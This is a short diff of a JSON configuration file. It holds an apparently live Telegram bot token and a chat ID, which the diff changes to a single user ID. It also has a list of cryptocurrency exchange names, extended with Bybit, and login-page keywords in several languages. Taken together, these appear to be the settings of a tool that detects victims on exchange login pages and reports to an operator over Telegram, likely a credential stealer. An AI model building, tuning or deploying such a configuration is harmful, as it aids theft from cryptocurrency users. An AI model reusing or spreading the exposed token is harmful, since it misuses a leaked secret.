@@ -1,6 +1,6 @@
 {
   "botToken": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
-  "chatId": "-1002836423777",
+  "chatId": "8025121083",
   "keywords": [
     "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
     "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
@@ -12,7 +12,7 @@
     "LATOKEN","LBank","Liquid","Mandala Exchange","MAX Exchange","Mercado Bitcoin","MEXC","Nicehash","Nexo",
     "Nominex","OceanEx","OKCoin","OKX","Paribu","Phemex","Poloniex","ProBit Global","SFOX","SimpleSwap","STEX",
     "SuperEx","Tapbit","Toobit","Tokocrypto","Uniswap","Upbit","UPB","VCC Exchange","WazirX","WhiteBIT","XT.COM",
-    "Zaif","Zebpay","ZBG","ZB.com","ZenGo","krypto","criptoswaps","novadax","foxbit","ripio"
+    "Zaif","Zebpay","ZBG","ZB.com","ZenGo","krypto","criptoswaps","novadax","foxbit","ripio","Bybit","Bybitglobal"
   ],
   "loginKeywords": [
     "login", "loguin", "sign in", "entrar"
